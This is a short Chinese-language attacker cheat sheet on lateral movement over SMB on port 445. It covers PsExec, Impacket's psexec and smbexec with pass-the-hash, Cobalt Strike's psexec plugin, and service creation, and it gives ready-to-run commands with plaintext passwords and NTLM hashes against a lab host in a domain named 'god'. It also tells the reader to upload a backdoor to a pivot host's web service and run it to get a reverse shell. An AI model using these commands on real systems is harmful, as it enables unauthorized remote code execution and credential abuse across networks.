SMB(Server Message Block): 服务器消息块，一种用于网络文件共享的协议。
利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。
## **官方psexec程序**
psexec可以走SMB、IPC(命名通道)、RPC、共享内存等方式进程通信。会记录大量日志
交互式进程通信的windows 官方工具，可以反弹shell回来。走proxifier的socks代理 本地管理员运行。

```
psexec64.exe  \\192.168.3.32 -u administrator -p admin!@#45 -s cmd
```
上传后门到跳板机的80服务，下载并运行即可上线。


## **impacket套件里的psexec脚本程序，支持hash**
反弹shell，走proxifier的socks代理 本地运行。
psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32


## **impacket套件里的smbexec脚本程序，支持hash**
反弹shell，走proxifier的socks代理 本地运行。
```
smbexec ./administrator:admin!@#45@192.168.3.32

smbexec god/administrator:admin!@#45@192.168.3.32

smbexec -hashes: 518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32

smbexec -hashes:518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32

smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32
```



## **CS自带插件psexec 直接上线**
CS目录列表-横向移动-psexec ，账号密码或hash，直接监听器上线。
有输入域 如：god，就是域用户账户密码。
没输入域，就是本地用户账户密码


## **官方services服务（不常用）**
走smb的无回显命令
```
service -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe

services-hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell
```